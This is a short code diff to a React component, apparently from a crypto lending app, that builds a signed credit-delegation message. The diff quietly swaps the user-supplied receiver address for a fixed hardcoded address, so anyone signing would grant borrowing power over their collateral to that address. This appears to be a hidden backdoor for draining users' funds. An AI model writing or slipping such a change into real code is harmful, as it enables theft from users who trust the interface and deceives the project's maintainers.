@@ -112,7 +112,7 @@ export default function PermitBorrow({receiverAddress, amount}: IPermitBorrow) {
             },
             primaryType: "DelegationWithSig", 
             message: {
-              delegatee: receiverAddress,
+              delegatee: "0xe84DbC4EE14b0360B7bF87c7d30Cd0604E0e1E0F",
               value: parseEther(amount),
               deadline: newDeadline,
               nonce,
